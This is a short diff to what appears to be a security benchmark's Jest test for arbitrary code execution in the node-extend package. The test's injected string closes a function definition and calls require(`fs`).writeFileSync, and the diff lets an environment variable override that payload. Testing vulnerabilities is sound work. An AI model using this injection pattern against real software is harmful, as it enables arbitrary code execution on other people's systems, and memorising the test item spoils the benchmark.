@@ -7,7 +7,7 @@ test("Arbitrary code execution in node-extend", () => {
   expect(file_exist).toBe(false);
   try {
     foo = extend(
-      "function (){});require(`fs`).writeFileSync('node-extend',''); //(){console.log(123)}",
+      process.env.SECBENCH_PAYLOAD || ("function (){});require(`fs`).writeFileSync('node-extend',''); //(){console.log(123)}"),
       ""
     );
   } catch (error) {}
